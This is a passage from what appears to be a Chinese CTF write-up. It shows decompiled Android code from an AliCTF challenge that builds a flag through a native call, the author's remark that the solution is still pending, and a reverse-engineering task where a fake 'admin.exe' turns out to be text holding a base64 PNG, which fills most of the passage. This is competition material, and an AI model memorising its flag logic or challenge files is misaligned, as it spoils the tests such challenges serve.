tv2.setText("AliCTF"); if (MainActivity.this.beg - MainActivity.this.now &lt;= 0) &#123; tv1.setText("The flag is:"); tv2.setText("alictf&#123;" + MainActivity.this.stringFromJNI2(MainActivity.this.k) + "&#125;"); &#125; MainActivity mainActivity; if (MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) &#123; mainActivity = MainActivity.this; mainActivity.k += 100; &#125; else &#123; mainActivity = MainActivity.this; mainActivity.k--; &#125; tv1.setText("Time Remaining(s):" + (MainActivity.this.beg - MainActivity.this.now)); handler.postDelayed(this, MainActivity.this.t); &#125; &#125;, 0); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem item) &#123; if (item.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(item); &#125; static &#123; System.loadLibrary("lhm"); &#125;&#125; 解题待定..….我先去学下java 逆向入门下载得到一个admin.exe，运行提示，您的电脑版本不支持 file一下该文件，得到： 发现它并不是一个exe文件，是一个ASCII text文件，使用cat得到该文件的类容： 1data:image/png;base64,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